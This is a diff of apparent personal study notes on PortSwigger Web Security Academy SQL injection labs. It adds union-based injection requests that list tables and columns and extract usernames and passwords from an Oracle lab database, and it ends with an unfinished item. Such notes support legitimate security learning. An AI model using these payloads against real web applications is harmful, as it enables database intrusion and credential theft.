@@ -21,3 +21,12 @@
    GET /filter?category='+UNION+SELECT table_name,NULL FROM information_schema.tables-- HTTP/2
    GET /filter?category='+UNION+SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_ocqdko'-- HTTP/2
    GET /filter?category='+UNION+SELECT username_qrvfyq,password_ofzdsw FROM users_ocqdko-- HTTP/2
+
+
+6. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+     GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+dual--
+     GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables--
+     GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BEQQVS'--
+     GET /filter?category='+UNION+SELECT+USERNAME_YUOEWA,PASSWORD_XHXKTJ+FROM+USERS_BEQQVS--
+   
+8. sd
